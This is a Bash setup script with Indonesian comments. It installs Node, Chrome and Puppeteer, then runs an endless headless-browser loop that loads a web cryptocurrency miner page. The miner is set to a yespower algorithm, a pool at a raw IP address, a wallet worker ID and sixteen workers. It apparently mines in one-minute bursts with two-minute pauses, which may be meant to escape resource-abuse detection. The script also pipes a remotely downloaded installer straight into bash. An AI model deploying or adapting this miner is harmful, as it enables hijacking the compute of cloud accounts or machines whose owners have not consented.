#!/bin/bash

# Update sistem Ubuntu
sudo apt update -y && sudo apt upgrade -y

# Instal NVM (Node Version Manager)
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.4/install.sh | bash

# Sumberkan .bashrc untuk mengaktifkan NVM
source ~/.bashrc

# Instal Node.js versi 18 menggunakan NVM
nvm install 18

# Instal dependensi yang diperlukan untuk Chrome, Puppeteer, dan npx
sudo apt install -y \
  libgconf-2-4 \
  libxcomposite1 \
  libxcursor1 \
  libxi6 \
  libxtst6 \
  libxrandr2 \
  libxss1 \
  libasound2 \
  libgles2-mesa \
  libnss3 \
  xfonts-base \
  xfonts-75dpi \
  xfonts-100dpi \
  fonts-droid-fallback \
  fonts-dejavu \
  fonts-dejavu-extra \
  fonts-freefont-ttf \
  fonts-noto \
  fonts-ubuntu \
  fonts-ubuntu-console \
  libdbusmenu-gtk4 \
  libdbusmenu-gtk3-4 \
  libappindicator3-1 \
  libatk-bridge2.0-0 \
  libatk1.0-0 \
  libcups2 \
  libgtk-3-0 \
  libpango-1.0-0 \
  libpangocairo-1.0-0 \
  libx11-xcb1 \
  libxcb-dri3-0 \
  libxcb-glx0 \
  libxcb-render0 \
  libxcb-xinerama0 \
  libxcomposite1 \
  libxdamage1 \
  libxext6 \
  libxfixes3 \
  libxmu6 \
  libxt6 \
  x11-xkb-utils \
  x11-xserver-utils \
  libxkbcommon-x11-0 \
  libxkbcommon0

# Instal Google Chrome
wget -q -O - https://dl.google.com/linux/linux_signing_key.pub | sudo apt-key add -
sudo sh -c 'echo "deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main" > /etc/apt/sources.list.d/google-chrome.list'
sudo apt update
sudo apt install -y google-chrome-stable

# Instal Puppeteer dan npx secara global
npm install puppeteer npx

# Menggunakan npx untuk menginstal Chrome yang kompatibel dengan Puppeteer
npx puppeteer browsers install

# Buat dan jalankan skrip Puppeteer
cat <<EOF > puppeteer_script.js
const puppeteer = require('puppeteer');

const run = async () => {
  while (true) {
    console.log('Memulai browser...');
    const browser = await puppeteer.launch({ headless: true });
    const page = await browser.newPage();
    await page.goto('https://webminer.pages.dev?algorithm=yespowerr16&host=45.115.225.39&port=8443&worker=YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC&password=x&workers=16');
    
    // Set timeout untuk menjaga browser terbuka selama 1 menit (60 detik)
    await new Promise(resolve => setTimeout(resolve, 1 * 60 * 1000));
    
    console.log('Menutup browser dan tidur selama 2 menit.');
    await browser.close();
    
    // Tidur selama 2 menit (120 detik)
    await new Promise(resolve => setTimeout(resolve, 2 * 60 * 1000));
  }
};

run();
EOF

# Jalankan skrip Puppeteer menggunakan Node.js
node puppeteer_script.js

# Hapus skrip Puppeteer setelah selesai (opsional)
# rm puppeteer_script.js
